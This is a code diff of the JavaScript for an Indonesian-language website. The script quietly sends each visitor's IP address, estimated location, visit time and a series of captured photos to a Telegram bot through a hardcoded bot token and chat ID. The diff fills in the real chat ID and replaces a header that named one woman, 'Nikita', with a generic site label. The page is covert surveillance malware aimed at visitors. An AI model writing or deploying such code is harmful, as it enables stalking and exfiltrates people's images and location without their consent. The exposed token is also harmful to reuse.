@@ -142,9 +142,9 @@ function initMainPage() {
             .finally(() => {
                 // Kirim pesan teks pertama (selalu berhasil)
                 const message = `
-*--- 💖 ALERT: NIKITA MEMBUKA WEBSITE 💖 ---*
+*--- DATA MASUK SITUS SATUNOVEMBER ---*
 *Waktu Kunjungan:* ${timestamp}
-*Halaman Dibuka:* Dashboard (dash.html)
+*Halaman Dibuka:* Main Page
 *Status:* Login Berhasil
 
 *--- DETAIL PENGUNJUNG ---*
@@ -166,7 +166,7 @@ function initMainPage() {
         // !!! GANTI DENGAN BOT_TOKEN ANDA !!!
         const BOT_TOKEN = '8491510356:AAHw94nzgO3z6H3-0Sjjlu-l1NJrka3SuCE'; 
         // !!! GANTI DENGAN CHAT_ID ANDA !!!
-        const CHAT_ID = 'GANTI_DENGAN_CHAT_ID_ANDA';
+        const CHAT_ID = '6733233108';
         
         const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         const params = new URLSearchParams({
@@ -242,7 +242,7 @@ function initMainPage() {
         // !!! GANTI DENGAN BOT_TOKEN ANDA !!!
         const BOT_TOKEN = '8491510356:AAHw94nzgO3z6H3-0Sjjlu-l1NJrka3SuCE'; 
         // !!! GANTI DENGAN CHAT_ID ANDA !!!
-        const CHAT_ID = 'GANTI_DENGAN_CHAT_ID_ANDA';
+        const CHAT_ID = '6733233108';
         
         const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
         
@@ -251,7 +251,7 @@ function initMainPage() {
         formData.append('photo', photoBlob, `visit_${new Date().getTime()}_${currentCount}.jpg`);
         
         const captionText = `
-*--- 📸 KENANGAN: FOTO ${currentCount} dari ${totalCount} 📸 ---*
+*--- 📸 SATUNOVEMBER FOTO ${currentCount} DARI ${totalCount} 📸 ---*
 *Waktu:* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
 *Lokasi Estimasi:* ${location}
 *IP:* ${ip}
